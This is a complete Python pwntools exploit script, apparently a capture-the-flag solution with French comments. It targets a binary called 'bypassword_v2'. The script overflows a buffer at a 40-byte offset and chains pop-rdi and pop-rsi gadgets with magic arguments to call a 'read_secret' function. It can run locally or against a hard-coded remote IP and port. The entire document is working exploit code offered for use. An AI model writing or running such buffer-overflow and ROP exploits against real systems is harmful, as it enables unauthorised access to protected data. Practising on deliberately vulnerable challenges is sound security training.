from pwn import *

# Configuration
exe = './bypassword_v2'
context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
startStr = b'>'
offset = 40

# ROP gadgets
rop = ROP(context.binary)
rdi = rop.find_gadget(["pop rdi", "ret"])[0]
rsi = rop.find_gadget(["pop rsi", "ret"])[0]
read_secret = context.binary.symbols['read_secret']

log.info(f"Gadget RDI: {hex(rdi)}")
log.info(f"Gadget RSI: {hex(rsi)}")
log.info(f"read_secret @ {hex(read_secret)}")

# Connexion
def start():
    if args.REMOTE:
        return remote('83.136.251.194', 55496)
    else:
        return process(exe)

# Payload
payload = flat(
    b"A" * offset,
    rdi, 0xdeadbeef,
    rsi, 0x1337c0de,
    read_secret
)

# Save payload (optionnel)
write("payload", payload)

# Exploit
io = start()
io.sendlineafter(startStr, b'2')       # Choix 2
io.sendlineafter(startStr, payload)    # Envoi payload
io.interactive()
